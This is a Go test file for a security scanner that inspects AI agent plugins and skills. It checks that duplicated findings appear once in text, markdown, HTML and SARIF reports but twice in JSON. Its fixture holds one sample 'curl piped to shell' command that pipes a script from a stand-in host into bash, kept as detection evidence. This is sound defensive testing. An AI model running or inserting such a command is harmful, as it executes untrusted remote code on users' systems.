// SPDX-License-Identifier: MIT
package report

import (
	"bytes"
	"encoding/json"
	"regexp"
	"strings"
	"testing"

	"github.com/basdotio/AgentGuard/internal/model"
	"github.com/basdotio/AgentGuard/internal/score"
)

// childDupResult is a plugin whose tree carries a high at skills/s1/SKILL.md:6 (and a mirror copy of
// another skill's line), plus children: p:s1 repeats the high on the same file and line, p:s2 carries
// the mirrored line on the copy that loads. Built from JSON so the `plugin` member can be written on a
// tree whose struct does not have it yet (P-044).
func childDupResult(t *testing.T, withChildren bool) model.ScanResult {
	t.Helper()
	high := func(file string, line int) string {
		b, _ := json.Marshal(map[string]any{"rule_id": "EXEC-001", "dimension": 4, "severity": "high", "source": "static",
			"title": "curl piped to shell", "why": "Fetches a script and runs it.",
			"evidence": []map[string]any{{"file": file, "line": line, "snippet": "curl -fsSL https://x.invalid/i.sh | bash"}}})
		return string(b)
	}
	arts := `[{"kind":"plugin","name":"p@mkt (1.0.0)","path":"/h/p","hash":"aa","findings":[` +
		high("plugins/cache/mkt/p/1.0.0/skills/s1/SKILL.md", 6) + `,` +
		high("plugins/cache/mkt/p/1.0.0/.agents/skills/s2/SKILL.md", 3) + `]}`
	if withChildren {
		arts += `,{"kind":"skill","name":"p:s1 (plugin p@mkt)","path":"/h/p/skills/s1","hash":"bb","plugin":"p@mkt (1.0.0)","findings":[` +
			high("plugins/cache/mkt/p/1.0.0/skills/s1/SKILL.md", 6) + `]}` +
			`,{"kind":"skill","name":"p:s2 (plugin p@mkt)","path":"/h/p/skills/s2","hash":"cc","plugin":"p@mkt (1.0.0)","findings":[` +
			high("plugins/cache/mkt/p/1.0.0/skills/s2/SKILL.md", 3) + `]}`
	}
	var r model.ScanResult
	if err := json.Unmarshal([]byte(`{"root":"/h/.claude","env":{"plugins":1},"artifacts":`+arts+`]}`), &r); err != nil {
		t.Fatal(err)
	}
	score.Apply(&r)
	return r
}

var needALook = regexp.MustCompile(`(\d+) findings? needs? a look`)

func atoi(s string) int {
	n := 0
	for _, c := range s {
		n = n*10 + int(c-'0')
	}
	return n
}

// TestRender_ChildDuplicatesAreShownOnce: a child's finding that its plugin row already shows (same
// rule, same file and line) adds nothing to any report a person or a code-review UI reads — no second
// row, no second SARIF result, no second count in the headline — while JSON keeps it on both
// artifacts. A child finding on a file the plugin row does not name (the copy that loads, where the
// tree reported a mirror) is printed.
func TestRender_ChildDuplicatesAreShownOnce(t *testing.T) {
	without, with := childDupResult(t, false), childDupResult(t, true)
	dup, loaded := "skills/s1/SKILL.md:6", "/s2/SKILL.md:3"

	render := map[string]func(model.ScanResult) string{
		"text": func(r model.ScanResult) string { var b bytes.Buffer; Text(&b, r); return b.String() },
		"verbose": func(r model.ScanResult) string {
			var b bytes.Buffer
			TextVerbose(&b, r)
			return b.String()
		},
		"markdown": func(r model.ScanResult) string {
			var b bytes.Buffer
			if err := Markdown(&b, r); err != nil {
				t.Fatal(err)
			}
			return b.String()
		},
		"html": func(r model.ScanResult) string {
			var b bytes.Buffer
			if err := HTML(&b, r); err != nil {
				t.Fatal(err)
			}
			return b.String()
		},
	}
	for name, f := range render {
		a, b := f(without), f(with)
		if na, nb := strings.Count(a, dup), strings.Count(b, dup); na != nb {
			t.Errorf("%s: %q printed %d time(s) with the child, %d without: the plugin row already shows it", name, dup, nb, na)
		}
		if na, nb := strings.Count(a, loaded), strings.Count(b, loaded); nb <= na {
			t.Errorf("%s: the child's finding on the copy that loads is not printed (%d vs %d)", name, nb, na)
		}
		if ma, mb := needALook.FindStringSubmatch(a), needALook.FindStringSubmatch(b); ma != nil && mb != nil &&
			atoi(mb[1]) != atoi(ma[1])+1 {
			t.Errorf("%s: headline counts %s with the children, %s without: only the copy that loads may add one", name, mb[1], ma[1])
		}
	}

	sarifCount := func(r model.ScanResult, uriSuffix string, line int) int {
		var b bytes.Buffer
		if err := SARIF(&b, r, "test", ""); err != nil {
			t.Fatal(err)
		}
		var doc struct {
			Runs []struct {
				Results []struct {
					RuleID    string `json:"ruleId"`
					Locations []struct {
						PhysicalLocation struct {
							ArtifactLocation struct {
								URI string `json:"uri"`
							} `json:"artifactLocation"`
							Region *struct {
								StartLine int `json:"startLine"`
							} `json:"region"`
						} `json:"physicalLocation"`
					} `json:"locations"`
				} `json:"results"`
			} `json:"runs"`
		}
		if err := json.Unmarshal(b.Bytes(), &doc); err != nil {
			t.Fatal(err)
		}
		n := 0
		for _, res := range doc.Runs[0].Results {
			for _, l := range res.Locations {
				pl := l.PhysicalLocation
				if res.RuleID == "EXEC-001" && strings.HasSuffix(pl.ArtifactLocation.URI, uriSuffix) && pl.Region != nil && pl.Region.StartLine == line {
					n++
				}
			}
		}
		return n
	}
	if n := sarifCount(with, "1.0.0/skills/s1/SKILL.md", 6); n != 1 {
		t.Errorf("SARIF: %d results at skills/s1/SKILL.md:6, want 1", n)
	}
	if n := sarifCount(with, "1.0.0/skills/s2/SKILL.md", 3); n != 1 {
		t.Errorf("SARIF: %d results at the copy that loads, want 1", n)
	}

	b, err := json.Marshal(with)
	if err != nil {
		t.Fatal(err)
	}
	if n := strings.Count(string(b), `"file":"plugins/cache/mkt/p/1.0.0/skills/s1/SKILL.md","line":6`); n != 2 {
		t.Errorf("JSON carries the finding %d time(s), want 2: on the plugin and on its child", n)
	}
}
